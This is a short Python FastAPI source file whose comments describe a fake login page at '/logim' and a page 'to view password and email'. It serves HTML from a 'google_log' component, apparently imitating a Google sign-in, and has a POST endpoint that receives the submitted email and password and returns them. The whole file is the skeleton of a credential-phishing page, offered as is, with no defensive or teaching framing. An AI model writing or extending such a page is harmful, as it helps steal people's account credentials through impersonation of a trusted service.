# author: italo Lima
#  facke page : http://localhost:8000/logim
#  page to view password and email: http://localhost:8000/secret/password/status

from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
from components import google_log

app = FastAPI()

@app.get("/logim")
def home_page():
    return HTMLResponse(content=google_log())

@app.post("/secret/password/status")
async def submit(data: dict):
    email = data.get("email")
    password = data.get("password")
    return JSONResponse({"email": email, "password": password})

